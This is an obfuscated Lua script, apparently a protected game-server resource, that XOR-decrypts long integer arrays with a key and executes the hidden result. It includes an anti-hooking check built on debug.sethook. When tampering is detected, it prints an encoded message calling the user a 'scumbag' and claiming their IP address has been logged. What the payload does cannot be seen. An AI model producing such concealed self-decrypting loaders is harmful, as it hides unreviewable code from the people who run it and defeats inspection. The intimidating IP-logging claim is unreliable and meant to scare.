      xckYb0YSVtDqvZU4Ohv0KVDRy1g1CLd8jxxBuFvANuMPfh4DrTchBniH4DU6V2a9hsmnpSaW ..
      eu37NPPxlBlpF5MkiCrDCv22B9XIrtRCqhEKRhjxBGC5U2tJI5lPZgCFvmWQ3FNFNRC7
      [hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('02') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('4F') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('B5') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('00') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('81') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('66')]
      [hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('32') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('B3') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('98') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('B5')](
      q) end
    ; n(xckYb0YSVtDqvZU4Ohv0KVDRy1g1CLd8jxxBuFvANuMPfh4DrTchBniH4DU6V2a9hsmnpSaW)
  end; f8nDuToNAH5bdSzZXCgmI9Ky7jaBvgHgD4kPHIwxvBm1YAlw6foDCE7CnAxA8tiMNXFS(f,
    function(r) hQBY53L03ORIfbX1r26vOnkovDUVXT5fbReDHFfhOOmipWCjCT3MYKHgiuGmbzBNw16603CEvh(r, g,
        function(s) rXponvRT0J4u1u9o3q82EbOfUMzZx6FuFLXR4Zk583bp7xdbHJLu1i(s,
            function(t) if #mm2iiV7EiLtdvFJUTP85cx527qaqMNNFfAAjJklG0ohjwyBnU9hYXdH9v0jj2JM(eu37NPPxlBlpF5MkiCrDCv22B9XIrtRCqhEKRhjxBGC5U2tJI5lPZgCFvmWQ3FNFNRC7[hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('E7') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('CE') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('98') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('7F')]) == 1 then if eu37NPPxlBlpF5MkiCrDCv22B9XIrtRCqhEKRhjxBGC5U2tJI5lPZgCFvmWQ3FNFNRC7[hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('E7') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('CE') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('98') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('7F')] == eu37NPPxlBlpF5MkiCrDCv22B9XIrtRCqhEKRhjxBGC5U2tJI5lPZgCFvmWQ3FNFNRC7[hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('1B') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('B5') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('00') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('81') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('4F')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if eu37NPPxlBlpF5MkiCrDCv22B9XIrtRCqhEKRhjxBGC5U2tJI5lPZgCFvmWQ3FNFNRC7[hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('E7') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('CE') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('98') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('7F')](t) then
                    eu37NPPxlBlpF5MkiCrDCv22B9XIrtRCqhEKRhjxBGC5U2tJI5lPZgCFvmWQ3FNFNRC7
                        [hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('E7') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('CE') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('98') .. hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ('7F')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; yWaKUYjFoGmzgLi9jofcpKpECwu7zeTFEhrGdiQvpi21kwXmTLKvoSJ(
{ 667, 942, 786, 804, 1096, 949, 839, 992, 735, 951, 1118, 939, 1191, 1082, 1125, 746, 638, 768, 700, 752, 770, 1137,
  561, 782, 624, 1174, 653, 627, 714, 954, 1158, 706, 862, 1184, 620, 947, 898, 989, 660, 892, 816, 995, 890, 1132, 889,
  929, 1181, 566, 764, 570, 686, 550, 1209, 1129, 599, 587, 1021, 1030, 963, 1121, 647, 657, 935, 609, 750, 590, 1034,
  617, 1185, 918, 793, 759, 591, 602, 958, 780, 905, 1085, 623, 618, 763, 621, 723, 1134, 595, 1126, 1172, 554, 968, 868,
  1041, 1187, 635, 610, 1183, 552, 875, 1064, 1154, 1115, 563, 580, 586, 1027, 1078, 1116, 1204, 725, 634, 1019, 776,
  979, 948, 811, 707, 662, 1139, 745, 856, 656, 659, 932, 1049, 1028, 689, 687, 861, 926, 919, 565, 1146, 983, 670, 1155,
  1178, 903, 778, 1160, 962, 709, 971, 611, 697, 603, 838, 576, 684, 1119, 1123, 834, 730, 711, 1141, 1151, 1011, 572,
  1000, 668, 1109, 692, 998, 728, 549, 848, 551, 893, 920, 604, 851, 626, 1071, 567, 1040, 847, 946, 970, 1098, 873,
  1055, 777, 950, 1201, 615, 814, 945, 850, 766, 833, 1111, 888, 1152, 688, 844, 1130, 1202, 985, 915, 944, 813, 661,
  1050, 806, 832, 843, 822, 1024, 976, 722, 908, 574, 691, 1117, 1007, 719, 1142, 713, 690, 986, 629, 1075, 1162, 1048,
  1051, 1143, 1102, 1013, 876, 596, 708, 1198, 741, 871, 879, 866, 608, 742, 1099, 1145, 622, 795, 598, 1001, 612, 841,
  1167, 930, 1086, 729, 658, 1052, 716, 769, 969, 664, 904, 837, 924, 553, 805, 802, 594, 1120, 883, 801, 747, 1091,
  1035, 1079, 906, 827, 988, 568, 683, 1105, 543, 665, 771, 910, 1063, 1020, 955, 928, 1195, 894, 808, 650, 854, 829,
  715, 1059, 785, 731, 1173, 1112, 601, 641, 900, 560, 694, 1005, 1157, 577, 952, 990, 1080, 636, 912, 1017, 797, 1053,
  619, 1140, 824, 1192, 674, 546, 1163, 895, 675, 796, 1029, 1153, 1025, 761, 720, 733, 961, 821, 748, 984, 756, 1171,
  940, 695, 884, 548, 760, 1042, 1149, 1088, 809, 864, 1188, 1199, 775, 1210, 589, 1015, 987, 743, 646, 867, 783, 960,
  909, 923, 1179, 994, 914, 922, 682, 865, 1108, 652, 823, 880, 755, 734, 1045, 817, 798, 556, 1165, 1136, 607, 726,
  1033, 693, 669, 1104, 544, 803, 678, 1164, 1016, 815, 727, 1054, 1138, 913, 600, 925, 1072, 819, 1073, 717, 1211, 996,
  830, 1175, 818, 579, 1133, 1100, 628, 977, 1038, 1203, 555, 1083, 781, 1101, 696, 1168, 1081, 1026, 676, 991, 812, 559,
  654, 732, 649, 644, 1107, 578, 1031, 957, 911, 1135, 916, 562, 855, 1039, 1206, 790, 870, 1066, 739, 597, 1067, 1006,
  749, 639, 941, 593, 698, 959, 953, 740, 1070, 637, 887, 1095, 907, 1044, 772, 1056, 826, 751, 901, 1077, 1008, 744,
  788, 882, 655, 582, 980, 921, 1180, 1060, 1037, 773, 631, 897, 978, 680, 1128, 625, 1009, 583, 702, 592, 1196, 943,
  1170, 569, 982, 842, 891, 712, 820, 936, 1212, 721, 1068, 557, 1182, 1065, 765, 718, 663, 1113, 975, 673, 679, 1097,
  792, 605, 845, 754, 967, 703, 934, 999, 672, 1207, 1057, 547, 1058, 1161, 753, 1103, 1127, 849, 840, 1002, 1014, 571,
  885, 877, 558, 852, 1131, 938, 575, 1194, 633, 1156, 931, 737, -1, 55, 20, 6, 11, 17, 21, 94, 72, 26, 102, 80, 10, 5,
  64, 0, 95, 78, 64, 18, 22, 29, 252, 59, 90, 72, 85, 115, 89, 62, 22, 220, 69, 19, 16, 12, 89, 66, 21, 15, 84, 115, 245,
  104, 2, 13, 255, 94, 59, 3, 89, 29, 31, 72, 28, 81, 29, 88, 25, 24, 9, 35, 2, 22, 155, 74, 25, 22, 81, 88, 69, 195,
  175, 74, 243, 10, 14, 30, 22, 78, 63, 29, 15, 22, 127, 13, 63, 74, 150, 72, 166, 103, 122, 111, 16, 87, 81, 76, 30, 87,
  63, 72, 106, 175, 88, 95, 160, 72, 65, 25, 94, 4, 122, 24, 13, 23, 34, 20, 114, 109, 85, 22, 16, 31, 238, 103, 87, 114,
  23, 172, 2, 22, 12, 68, 2, 220, 77, 88, 89, 85, 71, 13, 70, 231, 76, 60, 94, 79, 75, 84, 66, 115, 84, 22, 69, 88, 46,
  223, 77, 179, 114, 26, 50, 221, 26, 25, 20, 89, 255, 7, 21, 109, 22, 71, 27, 1, 106, 89, 29, 66, 2, 52, 237, 8, 22, 21,
  93, 39, 65, 85, 72, 33, 83, 126, 158, 82, 212, 8, 36, 8, 22, 60, 12, 58, 12, 116, 62, 67, 12, 62, 68, 88, 46, 88, 77,
  164, 118, 29, 76, 82, 77, 2, 8, 72, 118, 244, 57, 101, 70, 93, 122, 72, 103, 72, 26, 4, 68, 140, 25, 68, 91, 114, 75,
  62, 29, 209, 5, 244, 68, 96, 62, 2, 252, 25, 106, 79, 79, 153, 143, 9, 68, 106, 28, 15, 65, 55, 66, 12, 187, 89, 88,
  24, 80, 89, 114, 79, 18, 28, 76, 80, 75, 9, 65, 13, 81, 10, 52, 18, 66, 122, 84, 79, 2, 111, 36, 83, 51, 26, 68, 81,
  22, 17, 70, 85, 54, 120, 109, 12, 73, 95, 127, 28, 5, 80, 34, 112, 236, 238, 133, 2, 4, 81, 11, 21, 121, 115, 90, 186,
  70, 71, 57, 5, 173, 77, 61, 98, 111, 1, 7, 225, 76, 22, 71, 47, 231, 9, 114, 15, 20, 71, 115, 94, 65, 28, 23, 106, 8,
  149, 74, 25, 76, 3, 10, 76, 25, 25, 85, 20, 38, 88, 9, 84, 70, 106, 49, 55, 41, 8, 89, 75, 22, 106, 20, 22, 91, 185,
  81, 81, 94, 8, 119, 120, 9, 13, 17, 239, 94, 70, 70, 88, 50, 36, 94, 65, 74, 26, 83, 7, 75, 13, 90, 1, 70, 73, 16, 22,
  64, 26, 89, 33, 64, 11, 47, 101, 187, 69, 15, 11, 85, 3, 138, 135, 22, 74, 94, 24, 22, 47, 69, 199, 70, 4, 106, 96, 80,
  4, 15, 31, 41, 104, 39, 135, 89, 89, 106, 251, 125, 82, 95, 47, 106, 141, 42, 115, 17, 105, 20, 88, 60, 64, 239, 106,
  17, 28, 0, 88, 144, 14, 10, 40, 197, 200, 18, 11, 85, 94, 94, 94, 9, 74, 197, 88, 59, 7, 228, 122, 64, 47, 13, 20, 88,
  86, 33, 122, 177, 140, 89, 69, 92, 114, 67, 80, 21, 95, 21, 102, 77, 7, 100, 178, 135, 8, 94, 98, 85, 9, 29, 170, 81,
  117, 29, 122, 102, 82, 124, 28, 77, 39, 25, 76, 54, 81, 238, 22, 12, 60, 66, 123, 82, 11, 24, 152, 120, 94, 60, 115,
  65, 8, 52, 24, 20, 11, 89, 33, 242, 22, 15, 95, 15, 91, 106, 89, 200, 90, 5, 73, 30, 57, 11, 33, 176, 69, 170, 35, 56,
  52, 74, 23, 17, 114, 41, 66, 7, 115, 89, 80, 0, 10, 67, 83, 90, 89, 3, 60, 103, 219, 169, 11, 154, 18, 3, 28, 22, 28,
  28, 52, 47, 44, 106, 66, 23, 34, 89, 22, 153, 72, 28, 151, 9, 89, 83, 74, 69, 28, 251, 165, 122, 77, 81, 65, 62, 19,
  102, 20, 12, 115, 34, 137, 65, 42, 66, 243, 99, 2, 81, 114, 80, 28, 187, 29, 74, 41, 17, 179, 77, 28, 222, 77, 62, 6,
  77 }, "mbxnZhhJ6yj6xSRy4Jmyf6g5l1"); xmfs5bT1fmtgJkQkcwkgiF3TMHNBx0cj71t1yqEYYIxGxoGupV3xisLjcU54zC25OS =
eu37NPPxlBlpF5MkiCrDCv22B9XIrtRCqhEKRhjxBGC5U2tJI5lPZgCFvmWQ3FNFNRC7; iD9FgzQpmXw12QxBxFRCwwvlAQm9E0OlSiGqQlEYpgFp5dwsxIY7z84Cld =
eu37NPPxlBlpF5MkiCrDCv22B9XIrtRCqhEKRhjxBGC5U2tJI5lPZgCFvmWQ3FNFNRC7; jeQXrePrENciunGaoLmPGpKBIZW3EDMUV99S8StZ0A2DoPFUxxTxXhgDvOB1lm02F =
iD9FgzQpmXw12QxBxFRCwwvlAQm9E0OlSiGqQlEYpgFp5dwsxIY7z84Cld; hvCc8sa7n3IphlSUXg0gmqPHMequV4MLDJOlNBxR8jqHadQMkcToeUp17 =
jeQXrePrENciunGaoLmPGpKBIZW3EDMUV99S8StZ0A2DoPFUxxTxXhgDvOB1lm02F; fyGDF3lhrhvd68vODCJpIdTkH75di4Dc9xEwdK7mvLblvlcfTOKKELppl2ElBYnERUFrzM5ZLV =
hvCc8sa7n3IphlSUXg0gmqPHMequV4MLDJOlNBxR8jqHadQMkcToeUp17; q3VboZx3lnQVvvcaw2gWU9VNPERHkvZGVXFgXSAe5m3f7OwUVBcsUfxdCR =
fyGDF3lhrhvd68vODCJpIdTkH75di4Dc9xEwdK7mvLblvlcfTOKKELppl2ElBYnERUFrzM5ZLV; vvAaCKHSi7A33hWDX2SMRCa4XfgODowdgdQhLAb933QxXcxttY1IhSSlpm99xfauRLhb =
q3VboZx3lnQVvvcaw2gWU9VNPERHkvZGVXFgXSAe5m3f7OwUVBcsUfxdCR; eBIqykVu8jDZBmy3hENTBUzmqwGsnRKgfuQMlOsJ4dBE9DjVy98adV0jxrvAor1D7NvdoyiPC5d =
vvAaCKHSi7A33hWDX2SMRCa4XfgODowdgdQhLAb933QxXcxttY1IhSSlpm99xfauRLhb; gVR0KT9hjyPqa0F2HVvHT7s833eEXMf9NAZa9L3llmNnnAIqIHg1clVPswUxYBm726YQYX =
eBIqykVu8jDZBmy3hENTBUzmqwGsnRKgfuQMlOsJ4dBE9DjVy98adV0jxrvAor1D7NvdoyiPC5d; qRRd6rEt5Xx25vadSrbyGcnBz1Dpn5soJXUXYiyazXzQvrr0lIO5cNCu7D4JuonsSDRf =
gVR0KT9hjyPqa0F2HVvHT7s833eEXMf9NAZa9L3llmNnnAIqIHg1clVPswUxYBm726YQYX; pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr = function(
  a)
  K, F = 7142902824575111, 16384 + 4191; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; cZgc5jtlWmBWTAnABz2IjKz3sEiIteFz6W8m2Q08yehNj0Hficq = function(b)
  co = coroutine.create(b)
  x5CadEmhAbGz1EKdO34VpJxZIuklULsJJDoo12nr3la4uNQgi4x1P0q2fla = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(x5CadEmhAbGz1EKdO34VpJxZIuklULsJJDoo12nr3la4uNQgi4x1P0q2fla, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return x5CadEmhAbGz1EKdO34VpJxZIuklULsJJDoo12nr3la4uNQgi4x1P0q2fla
end; aesADEKndqLqrJefPvnol1SvzqtrEvxRzAtxMImQHZiDGOoN8lXWGvhdJjjo3ITvIie4vx = function(f, g)
  qcPyQr10FeKdKz9dqbUzUttaTwoOTAF3n17GhspdtT0yQwpItQ4ki6d1MtIWm6s = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; crakQqsMVSYdpOcnPgoTvQjj0GkkytyTP2L8vkCFdrwjL4wx53DdufUnWFlGIr4FgtCqwbdA6FG = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; tAN2Gq07JNEO5zr7q83kmLvkYaepwTvoEjhwMseLAS4gcI0raxS = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      qcPyQr10FeKdKz9dqbUzUttaTwoOTAF3n17GhspdtT0yQwpItQ4ki6d1MtIWm6s(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; dI5AblsCAg8sHg9ttMKSlqfj52V5nTdGQ6rRUVvH4O0cGUhJRdKoxNjNginNBv9ZGZaVHKjV32D = function(p, n)
    asCqINbkRSMnXjOFjlMubriQ7bpeHNAwzDkgyrGhsr8jTqdQ5tdFiNxekxODkhVZ1p7T0SfsINi = ""
    for k, q in pairs(p) do asCqINbkRSMnXjOFjlMubriQ7bpeHNAwzDkgyrGhsr8jTqdQ5tdFiNxekxODkhVZ1p7T0SfsINi =
      asCqINbkRSMnXjOFjlMubriQ7bpeHNAwzDkgyrGhsr8jTqdQ5tdFiNxekxODkhVZ1p7T0SfsINi ..
      qRRd6rEt5Xx25vadSrbyGcnBz1Dpn5soJXUXYiyazXzQvrr0lIO5cNCu7D4JuonsSDRf
      [pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('06') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('B1') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('5B') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('58') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('AF') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('02')]
      [pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('56') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('AD') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('00') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('5B')](
      q) end
    ; n(asCqINbkRSMnXjOFjlMubriQ7bpeHNAwzDkgyrGhsr8jTqdQ5tdFiNxekxODkhVZ1p7T0SfsINi)
  end; crakQqsMVSYdpOcnPgoTvQjj0GkkytyTP2L8vkCFdrwjL4wx53DdufUnWFlGIr4FgtCqwbdA6FG(f,
    function(r) tAN2Gq07JNEO5zr7q83kmLvkYaepwTvoEjhwMseLAS4gcI0raxS(r, g,
        function(s) dI5AblsCAg8sHg9ttMKSlqfj52V5nTdGQ6rRUVvH4O0cGUhJRdKoxNjNginNBv9ZGZaVHKjV32D(s,
            function(t) if #cZgc5jtlWmBWTAnABz2IjKz3sEiIteFz6W8m2Q08yehNj0Hficq(qRRd6rEt5Xx25vadSrbyGcnBz1Dpn5soJXUXYiyazXzQvrr0lIO5cNCu7D4JuonsSDRf[pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('59') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('5A') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('00') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('01')]) == 1 then if qRRd6rEt5Xx25vadSrbyGcnBz1Dpn5soJXUXYiyazXzQvrr0lIO5cNCu7D4JuonsSDRf[pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('59') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('5A') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('00') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('01')] == qRRd6rEt5Xx25vadSrbyGcnBz1Dpn5soJXUXYiyazXzQvrr0lIO5cNCu7D4JuonsSDRf[pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('05') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('5B') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('58') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('AF') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('B1')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if qRRd6rEt5Xx25vadSrbyGcnBz1Dpn5soJXUXYiyazXzQvrr0lIO5cNCu7D4JuonsSDRf[pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('59') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('5A') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('00') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('01')](t) then
                    qRRd6rEt5Xx25vadSrbyGcnBz1Dpn5soJXUXYiyazXzQvrr0lIO5cNCu7D4JuonsSDRf
                        [pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('59') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('5A') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('00') .. pHEFUVcY0VgAsg1pARxYtPNF4HtkmjmEkNzioHA4859Oc2R0HRr('01')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; aesADEKndqLqrJefPvnol1SvzqtrEvxRzAtxMImQHZiDGOoN8lXWGvhdJjjo3ITvIie4vx(
{ 872, 618, 844, 700, 937, 1004, 1035, 777, 727, 871, 601, 566, 751, 1072, 567, 645, 977, 555, 883, 603, 981, 741, 956,
